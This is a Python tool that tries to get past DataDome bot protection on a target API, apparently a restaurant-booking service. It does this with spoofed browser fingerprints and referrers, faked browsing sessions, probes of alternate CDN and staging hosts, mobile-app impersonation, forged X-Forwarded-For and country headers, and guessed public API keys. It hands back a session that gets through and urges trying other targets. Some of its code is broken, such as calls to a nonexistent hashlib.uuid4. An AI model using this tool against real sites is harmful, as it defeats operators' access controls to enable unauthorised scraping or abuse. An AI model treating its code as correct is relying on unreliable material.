#!/usr/bin/env python3
"""
Enhanced DataDome Bypass - Advanced Evasion with Browser Simulation
Uses multiple sophisticated techniques to bypass DataDome protection
"""

import requests
import random
import time
import json
import hashlib
import base64
from datetime import datetime
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import threading
import ssl
import socket

class EnhancedDataDomeBypass:
    def __init__(self):
        self.session = requests.Session()
        self.success_headers = None
        self.working_technique = None
        self.fingerprint_cache = {}
        
        # Real browser fingerprints
        self.browser_fingerprints = [
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                "sec_ch_ua_platform": '"macOS"',
                "sec_ch_ua_mobile": "?0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept_language": "en-US,en;q=0.9",
                "viewport": {"width": 1440, "height": 900},
                "timezone": "America/New_York",
                "browser_type": "chrome"
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "accept_language": "en-US,en;q=0.5",
                "viewport": {"width": 1920, "height": 1080},
                "timezone": "Europe/London",
                "browser_type": "firefox"
            },
            {
                "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept_language": "en-US,en;q=0.9",
                "viewport": {"width": 414, "height": 896},
                "timezone": "America/Los_Angeles",
                "browser_type": "safari_mobile"
            }
        ]
        
        # Legitimate referrers and traffic sources
        self.traffic_sources = [
            "https://www.google.com/search?q=thefork+restaurant+booking",
            "https://www.google.co.uk/search?q=book+restaurant+table",
            "https://www.bing.com/search?q=restaurant+reservations",
            "https://duckduckgo.com/?q=restaurant+booking+app",
            "https://www.tripadvisor.com/",
            "https://www.opentable.com/",
            "https://www.facebook.com/",
            "https://www.instagram.com/",
            "https://t.co/", # Twitter shortened URL
        ]

    def generate_browser_fingerprint(self, target_domain):
        """Generate realistic browser fingerprint"""
        fingerprint = random.choice(self.browser_fingerprints)
        
        headers = {
            "User-Agent": fingerprint["user_agent"],
            "Accept": fingerprint["accept"],
            "Accept-Language": fingerprint["accept_language"],
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        
        # Add browser-specific headers
        if fingerprint["browser_type"] == "chrome":
            headers.update({
                "sec-ch-ua": fingerprint["sec_ch_ua"],
                "sec-ch-ua-mobile": fingerprint["sec_ch_ua_mobile"],
                "sec-ch-ua-platform": fingerprint["sec_ch_ua_platform"],
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1"
            })
        
        # Add realistic referer
        if random.random() > 0.3:  # 70% chance of having a referer
            headers["Referer"] = random.choice(self.traffic_sources)
        
        return headers, fingerprint

    def technique_advanced_session_building(self, url):
        """Advanced technique: Build legitimate session through multiple steps"""
        try:
            domain = urllib.parse.urlparse(url).netloc
            base_domain = domain.replace('api.', '').replace('graphql.', '')
            
            print(f"[+] Building legitimate session for {domain}")
            
            # Step 1: Visit main website with search engine referer
            headers, fingerprint = self.generate_browser_fingerprint(domain)
            headers["Referer"] = "https://www.google.com/search?q=" + base_domain.replace('.', '+')
            
            main_url = f"https://{base_domain}/"
            time.sleep(random.uniform(1.0, 2.5))
            
            main_response = self.session.get(main_url, headers=headers, timeout=15)
            print(f"    Main site: {main_response.status_code}")
            
            if main_response.status_code != 200:
                return {"success": False, "error": f"Main site blocked: {main_response.status_code}"}
            
            # Step 2: Simulate browsing behavior - visit a few pages
            browse_paths = ["/", "/restaurants", "/about", "/contact"]
            for path in random.sample(browse_paths, 2):
                time.sleep(random.uniform(2.0, 4.0))
                browse_url = f"https://{base_domain}{path}"
                
                # Update referer to previous page
                headers["Referer"] = main_url
                browse_response = self.session.get(browse_url, headers=headers, timeout=10)
                print(f"    Browse {path}: {browse_response.status_code}")
                
                if browse_response.status_code == 200:
                    main_url = browse_url  # Update for next referer
            
            # Step 3: Now try the API endpoint as if called by the website
            time.sleep(random.uniform(1.5, 3.0))
            
            # Update headers for API call
            api_headers = headers.copy()
            api_headers.update({
                "Referer": main_url,
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": f"https://{base_domain}",
            })
            
            # Add realistic JS-generated headers
            api_headers.update({
                "X-Client-Version": "1.0.0",
                "X-Platform": "web",
                "X-Device-Id": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                "X-Session-Id": hashlib.sha1(str(time.time()).encode()).hexdigest()[:32],
                "X-Request-Id": hashlib.uuid4().hex[:16],
            })
            
            response = self.session.get(url, headers=api_headers, timeout=15)
            
            return self._analyze_response(response, "Advanced Session Building", api_headers)
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def technique_cdn_endpoint_rotation(self, url):
        """Try different CDN/edge endpoints that might have weaker protection"""
        try:
            domain = urllib.parse.urlparse(url).netloc
            base_url = url.replace(domain, "{}")
            
            # Common CDN/edge endpoints
            cdn_endpoints = [
                domain,  # Original
                domain.replace('api.', 'api-eu.'),
                domain.replace('api.', 'api-us.'),
                domain.replace('api.', 'api-prod.'),
                domain.replace('api.', 'api-staging.'),
                domain.replace('api.', 'cdn-api.'),
                domain.replace('api.', 'edge-api.'),
                domain.replace('.com', '.net'),
                f"www.{domain}",
                domain.replace('api.', ''),
            ]
            
            for endpoint in cdn_endpoints:
                try:
                    test_url = base_url.format(endpoint)
                    headers, _ = self.generate_browser_fingerprint(endpoint)
                    
                    time.sleep(random.uniform(1.0, 2.0))
                    response = self.session.get(test_url, headers=headers, timeout=10)
                    
                    print(f"    Testing CDN: {endpoint} - {response.status_code}")
                    
                    if response.status_code not in [403, 406] and "datadome" not in response.text.lower():
                        return self._analyze_response(response, f"CDN Rotation ({endpoint})", headers)
                    
                except Exception as e:
                    continue
            
            return {"success": False, "error": "All CDN endpoints blocked"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def technique_mobile_app_simulation(self, url):
        """Simulate mobile app traffic with app-specific headers"""
        try:
            headers = {
                "User-Agent": "TheForkApp/7.12.0 (iPhone; iOS 17.0; Scale/3.00)",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "X-App-Version": "7.12.0",
                "X-Platform": "ios",
                "X-Device-Model": "iPhone14,2",
                "X-OS-Version": "17.0",
                "X-App-Build": "2023.11.15.1",
                "X-Client-Id": hashlib.md5(str(random.random()).encode()).hexdigest(),
                "X-Device-Id": hashlib.sha256(str(random.random()).encode()).hexdigest()[:32],
                "X-Installation-Id": hashlib.uuid4().hex,
                "X-Request-Id": hashlib.uuid4().hex,
                "Connection": "keep-alive",
            }
            
            # Mobile apps often don't send referers
            time.sleep(random.uniform(1.5, 3.0))
            
            response = self.session.get(url, headers=headers, timeout=15)
            
            return self._analyze_response(response, "Mobile App Simulation", headers)
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def technique_http2_with_specific_ciphers(self, url):
        """Use specific HTTP/2 configuration and TLS ciphers"""
        try:
            # Create a new session with specific SSL configuration
            session = requests.Session()
            
            # Custom SSL context
            ssl_context = ssl.create_default_context()
            ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            
            headers, _ = self.generate_browser_fingerprint(urllib.parse.urlparse(url).netloc)
            
            # Add HTTP/2 specific headers
            headers.update({
                ":method": "GET",
                ":scheme": "https",
                ":authority": urllib.parse.urlparse(url).netloc,
                ":path": urllib.parse.urlparse(url).path or "/",
            })
            
            time.sleep(random.uniform(2.0, 3.5))
            
            response = session.get(url, headers=headers, timeout=15)
            
            return self._analyze_response(response, "HTTP/2 + Custom Ciphers", headers)
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def technique_geographic_ip_simulation(self, url):
        """Simulate requests from different geographic locations"""
        try:
            # Headers suggesting different geographic locations
            geo_configs = [
                {
                    "accept_language": "fr-FR,fr;q=0.9,en;q=0.8",
                    "timezone": "Europe/Paris",
                    "country": "FR"
                },
                {
                    "accept_language": "en-GB,en;q=0.9",
                    "timezone": "Europe/London", 
                    "country": "GB"
                },
                {
                    "accept_language": "es-ES,es;q=0.9,en;q=0.8",
                    "timezone": "Europe/Madrid",
                    "country": "ES"
                },
                {
                    "accept_language": "en-US,en;q=0.9",
                    "timezone": "America/New_York",
                    "country": "US"
                }
            ]
            
            for geo_config in geo_configs:
                try:
                    headers, _ = self.generate_browser_fingerprint(urllib.parse.urlparse(url).netloc)
                    
                    # Override with geographic specific settings
                    headers["Accept-Language"] = geo_config["accept_language"]
                    headers["CF-IPCountry"] = geo_config["country"]
                    headers["X-Forwarded-For"] = self._generate_ip_for_country(geo_config["country"])
                    
                    time.sleep(random.uniform(1.5, 3.0))
                    
                    response = self.session.get(url, headers=headers, timeout=12)
                    
                    print(f"    Geographic test {geo_config['country']}: {response.status_code}")
                    
                    if response.status_code not in [403, 406] and "datadome" not in response.text.lower():
                        return self._analyze_response(response, f"Geographic Simulation ({geo_config['country']})", headers)
                
                except Exception as e:
                    continue
            
            return {"success": False, "error": "All geographic simulations blocked"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def technique_api_key_simulation(self, url):
        """Try with various API key patterns that might bypass protection"""
        try:
            headers, _ = self.generate_browser_fingerprint(urllib.parse.urlparse(url).netloc)
            
            # Common API key header patterns
            api_key_headers = [
                {"X-API-Key": "public"},
                {"X-API-Key": "guest"},
                {"X-API-Key": "anonymous"},
                {"Authorization": "Bearer public"},
                {"Authorization": "Bearer guest"},
                {"X-Client-Token": "web"},
                {"X-Public-Key": "web-client"},
                {"X-App-Key": "web"},
                {"X-Access-Token": "public"},
            ]
            
            for api_headers in api_key_headers:
                try:
                    test_headers = headers.copy()
                    test_headers.update(api_headers)
                    
                    time.sleep(random.uniform(1.0, 2.0))
                    
                    response = self.session.get(url, headers=test_headers, timeout=10)
                    
                    print(f"    API key test {list(api_headers.keys())[0]}: {response.status_code}")
                    
                    if response.status_code not in [403, 406] and "datadome" not in response.text.lower():
                        return self._analyze_response(response, f"API Key Simulation", test_headers)
                
                except Exception as e:
                    continue
            
            return {"success": False, "error": "All API key simulations blocked"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _generate_ip_for_country(self, country):
        """Generate a realistic IP for a country"""
        ip_ranges = {
            "FR": ["82.64.0.0", "91.121.0.0", "195.154.0.0"],
            "GB": ["82.132.0.0", "86.96.0.0", "195.92.0.0"],  
            "ES": ["80.24.0.0", "84.88.0.0", "195.53.0.0"],
            "US": ["208.67.0.0", "173.252.0.0", "199.96.0.0"]
        }
        
        base_ip = random.choice(ip_ranges.get(country, ip_ranges["US"]))
        parts = base_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def _analyze_response(self, response, technique_name, headers=None):
        """Analyze response to determine if bypass was successful"""
        is_blocked = (
            response.status_code == 403 or
            response.status_code == 406 or
            "datadome" in response.text.lower() or
            any("datadome" in str(v).lower() for v in response.headers.values())
        )
        
        result = {
            "technique": technique_name,
            "success": not is_blocked,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "content_length": len(response.content),
            "response_time": response.elapsed.total_seconds(),
        }
        
        if not is_blocked:
            result["success_headers"] = headers if headers else {}
            result["cookies"] = dict(response.cookies)
            result["content_preview"] = response.text[:500]
            
        return result

    def test_all_techniques(self, url):
        """Test all advanced bypass techniques"""
        print(f"[+] Testing Enhanced DataDome bypass techniques against: {url}")
        
        techniques = [
            self.technique_advanced_session_building,
            self.technique_cdn_endpoint_rotation,
            self.technique_mobile_app_simulation,
            self.technique_geographic_ip_simulation,
            self.technique_api_key_simulation,
            self.technique_http2_with_specific_ciphers,
        ]
        
        results = []
        
        for i, technique in enumerate(techniques, 1):
            technique_name = technique.__name__.replace('technique_', '').replace('_', ' ').title()
            print(f"\n[+] Testing technique {i}: {technique_name}")
            
            try:
                result = technique(url)
                results.append(result)
                
                if result.get("success"):
                    print(f"[!] SUCCESS: {result['technique']} bypassed DataDome!")
                    print(f"    Status: {result['status_code']}")
                    print(f"    Response time: {result['response_time']:.2f}s")
                    print(f"    Content length: {result['content_length']} bytes")
                    
                    self.success_headers = result.get("success_headers")
                    self.working_technique = result["technique"]
                    break
                else:
                    print(f"[-] FAILED: {result['technique']} - {result.get('error', 'Blocked')}")
                    
            except Exception as e:
                print(f"[!] ERROR in {technique.__name__}: {e}")
                results.append({"technique": technique.__name__, "success": False, "error": str(e)})
            
            # Extended cool-down between techniques for stealth
            time.sleep(random.uniform(3.0, 6.0))
        
        return results

    def get_working_session(self):
        """Return a working session with successful headers"""
        if self.success_headers:
            working_session = requests.Session()
            working_session.headers.update(self.success_headers)
            return working_session
        return None

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced DataDome Bypass Tester')
    parser.add_argument('url', help='Target URL to test bypass techniques against')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    
    args = parser.parse_args()
    
    bypass = EnhancedDataDomeBypass()
    results = bypass.test_all_techniques(args.url)
    
    print(f"\n{'='*70}")
    print("ENHANCED DATADOME BYPASS RESULTS")
    print(f"{'='*70}")
    
    successful_techniques = [r for r in results if r.get("success")]
    
    if successful_techniques:
        print(f"\n[+] SUCCESS! Found {len(successful_techniques)} working bypass technique(s):")
        for result in successful_techniques:
            print(f"    - {result['technique']}")
            print(f"      Status: {result['status_code']}")
            print(f"      Response time: {result['response_time']:.2f}s")
            print(f"      Content: {result.get('content_length', 0)} bytes")
            
        print(f"\n[+] Working technique: {bypass.working_technique}")
        print(f"[+] You can now use bypass.get_working_session() to make requests")
        
    else:
        print(f"\n[-] All enhanced bypass techniques failed")
        print(f"[-] Target has extremely strong DataDome protection")
        print(f"[-] Consider switching to a different target or manual testing")
        
    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump({
                'target': args.url,
                'timestamp': datetime.now().isoformat(),
                'results': results,
                'successful_techniques': len(successful_techniques),
                'working_technique': bypass.working_technique
            }, f, indent=2)
        print(f"\n[+] Results saved to {args.output}")

if __name__ == '__main__':
    main()